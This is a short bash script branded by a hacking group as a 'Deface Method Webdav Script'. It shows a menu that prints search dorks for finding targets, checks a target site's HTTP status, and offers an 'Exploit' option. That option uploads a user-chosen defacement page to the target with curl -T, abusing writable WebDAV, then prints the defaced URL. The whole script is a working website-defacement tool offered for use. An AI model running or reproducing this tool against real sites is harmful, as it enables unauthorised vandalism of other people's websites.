clear
echo ""

echo -e "\e[1;31m 
                            \033[1;30m[ \033[1;34mTEAM \033[1;30m] \033[1;32mCYBER  \033[1;32mKING\033[1;31m SQUAD
                  \033[1;30m[\033[1;34m GITHUB\033[1;30m ] \033[1;34mD1ARK-VA4U3
                  \033[1;30m[ \033[1;34mCODER  \033[1;30m] \033[1;30mDARK077VAU
\033[0;00m

  _    _      _    ______            
| |  | |    | |   |  _  \           
| |  | | ___| |__ | | | |__ ___   __
| |/\| |/ _ \ '_ \| | | / _` \ \ / /
\  /\  /  __/ |_) | |/ / (_| |\ V / 
 \/  \/ \___|_.__/|___/ \__,_| \_/\e[0m" 

echo ""

echo -e "\e[1;95m      || =====> Deface Method Webdav Script <===== || "
echo ""
echo -e "\e[1;32m _______________ code  By D1ARK-VA4U3_______________\e[1;32m"
echo ""
echo -e "\e[1;91m                We are CKS \e[0m"
echo ""
op=("Dork" "Exploit" "Website inspection"  "exit")
select opt in "${op[@]}"
do 
echo ""
case $opt in
"Dork")
echo ""
cat dork.txt
;;
"Website inspection")
read -p "Enter Trage site :: " T 
url=$(curl -Iks $T | grep -I "HTTP/")
echo -e "\e[1;33m target situation :: $url \e[0m"

;;

"Exploit")
read -p "Enter  Trage site :: " t
echo ""
read -p "Enter Deface  Script  :: " p
echo ""
echo -e "\e[1;32m   Checking Your Deface Script \e[0m"

if [[ -e "$p" ]];then
echo ""
echo -e "\e[1;32m   OK,Found \e[0m"
curl -T $p $t

sleep 2
echo -e "\e[1;32m#====> :: $t/$p  \e[0m"
else
echo ""
echo -e "\e[1;31m    Deface Script Not Found\e[0m"
exit
fi
;;
"exit")
echo -e "\e[1;32m ××× Dont have a good day have a great day ✓✓✓\e[0m"
echo ""
echo -e "\e[1;32m        <==== Happy Hacking ====>"
echo ""
exit
;;
*) echo "invalid option"
;;
    esac
done
